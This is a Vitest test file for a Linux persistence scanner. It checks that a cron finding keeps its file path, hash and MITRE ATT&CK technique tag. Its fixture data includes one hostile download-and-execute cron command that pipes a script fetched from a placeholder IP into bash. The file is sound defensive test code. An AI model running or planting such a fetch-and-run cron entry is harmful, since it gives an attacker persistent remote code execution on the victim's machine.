import { describe, expect, it } from "vitest";
import { linuxFinding, techniqueOf } from "./linux";

describe("Linux persistence findings", () => {
  it("keep the file, its hash and the ATT&CK technique", () => {
    const f = linuxFinding(
      3,
      { file: "/etc/crontab", kind: "system-crontab", sha256: "ab".repeat(32) },
      {
        rule: "LNX-CRON-DOWNLOAD-EXEC",
        severity: "high",
        title: "Cron job downloads a script and runs it",
        location: "line 5",
        detail: "Downloads a script and runs it on line 5 of /etc/crontab: curl http://203.0.113.7/k.sh | bash",
        remediation: "Find out who added it.",
        reference: "MITRE ATT&CK T1053.003 Scheduled Task/Job: Cron",
      },
    );
    expect(f.title).toBe("Cron job downloads a script and runs it: /etc/crontab (line 5)");
    expect(f.category).toBe("Persistence");
    expect(f.description).toContain("File: /etc/crontab (System crontab), line 5.\nSHA-256 of the file as read: abab");
    expect(f.tags).toEqual(["linux", "persistence", "system-crontab", "T1053.003"]);
    expect(techniqueOf("MITRE ATT&CK T1037 Boot or Logon Initialization Scripts")).toBe("T1037");
    expect(techniqueOf("CIS 1.2")).toBeNull();
  });
});
